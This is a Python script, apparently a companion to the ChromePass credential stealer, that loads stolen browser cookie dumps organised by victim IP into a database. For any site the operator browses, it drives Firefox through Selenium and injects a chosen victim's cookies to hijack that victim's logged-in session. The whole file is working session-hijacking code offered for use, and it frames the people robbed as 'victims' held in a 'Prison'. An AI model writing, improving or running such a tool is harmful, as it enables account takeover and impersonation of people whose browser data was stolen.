from _modules.classes import Prison, Victim, CookieJar, Cookie
import json
import os
import time
import socket
import selenium
import tldextract
from selenium import webdriver
from webdriver_manager.firefox import GeckoDriverManager


def verify_selection(selection, sessions):
    if is_int(selection) and selection != "s":
        if selection in sessions:
            return True
    return False


def load_selection_screen(sessions, victim):
    os.system("cls")
    sessions_available = [number for (number, _) in victim.items()]
    print(f"[i] {sessions} sessions detected.")
    print(f"Sessions available: {sessions_available}")
    question = f"Which one to load? (s to skip): "
    selection = input(question)
    while not verify_selection(selection, sessions_available):
        print("[-] Couldn't find that, try again")
        selection = input(question)
    return selection


def load_cookies(victim, driver: webdriver.Firefox):
    sessions = len(victim)
    selection = next(iter(victim.keys()))
    if sessions > 1:
        selection = str(int(load_selection_screen(sessions, victim))-1)
    if selection == "s":
        print("[+] Skipping...")
        return False
    for domain in victim[selection]:
        for cookie in domain:
            cookie_obj = {
                "name": cookie.name,
                "value": cookie.value,
                "domain": cookie.domain
            }
            driver.add_cookie(cookie_obj)
    print("[+] Cookies loaded successfully")


def get_cookies(prison, directory="data"):
    if not os.path.exists(directory):
        print(
            "[-] No data detected. Please use ChromePass and place the Data folder here.")
        print("[i] ChromePass link: https://github.com/darkarp/chromepass")
        return False
    _, victims, _ = next(os.walk(directory))
    for victim in victims:
        victim_obj = Victim(victim)
        _, _, cookie_files = next(os.walk(f"{directory}/{victim}"))
        for cookie_file in cookie_files:
            if "cookies" in cookie_file:
                session_number = cookie_file[7:-5]
                with open(f"{directory}/{victim}/{cookie_file}") as f:
                    cookies = json.load(f)
                cookie_list = []
                for (_, cookiejar) in cookies.items():
                    for cookie in cookiejar:
                        cookie_list.append(Cookie(
                            cookie["name"], cookie["value"], cookie["domain"]))
                cookie_jar = CookieJar(cookie_list)
                victim_obj.update_cookies(cookie_jar, session_number)
                prison.add_victim(victim_obj)
    prison._save_db()
    print("[+] Database updated successfully...")
    return True


def is_ip(selection):
    try:
        socket.gethostbyname(selection)
        return True
    except socket.gaierror:
        return False


def is_int(number):
    try:
        int(number)
        return True
    except ValueError:
        return False


def victim_verify(victims, selection):
    if selection == "s":
        return True
    elif is_int(selection):
        if selection in victims:
            return victims[selection]
    elif is_ip(selection):
        for _, ip in victims.items():
            if ip == selection:
                return ip

    return False


def show_selection(victims):
    print("\nVictim list:")
    for (index, ip) in victims.items():
        print(f"{index}: {ip}")
    print("\n")
    selection = input("Who do you want to load? (number or ip, s to skip): ")
    if selection == "s":
        return False
    return selection


def selection_screen(victims, url):
    os.system("cls")
    if victims:
        victim_ips = {str(index): ip for (index, ip) in enumerate(victims)}
        print(
            f"[+] Found {len(victims)} victim(s) with cookies for the website: {url}")
        selection = show_selection(victim_ips)
        victim = victim_verify(victim_ips, selection)
        while not victim and selection:
            print("Couldn't find a record... Try again.")
            selection = show_selection(victim_ips)
            victim = victim_verify(victim_ips, selection)

        if selection:
            print(f"[+] Selection verified for: {victim}")
            print(f"[+] Loading Cookies")
            return victim
        else:
            print("[+] Skipping...")
    else:
        print(f"[-] Found 0 victims for the website: {url}")
    return False


def run_browser_interactive(database):
    print("[+] Checking for browser installation")
    driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())
    print(f"[+] Loading Browser...")
    driver.get("https://www.google.com")
    print("[+] Done")
    while True:
        url = driver.current_url
        domains = []
        subdomain, domain, suffix = tldextract.extract(url)
        full_url = f"{subdomain}.{domain}.{suffix}"
        domains.append(full_url)
        if subdomain:
            domains.append(f".{domain}.{suffix}")
        victims = database.from_domains(domains)
        victim = selection_screen(victims, url)
        while victim:
            load_cookies(victims[victim], driver)
            driver.get(url)
            victim = selection_screen(victims, url)
        time.sleep(1)


def run_browser_url(database, url):
    print("[-] To be implemented")


if __name__ == "__main__":
    print("[!] Warning: This is still a very early stage proof of concept...")
    database = Prison()
    if get_cookies(database):
        run_browser_interactive(database)
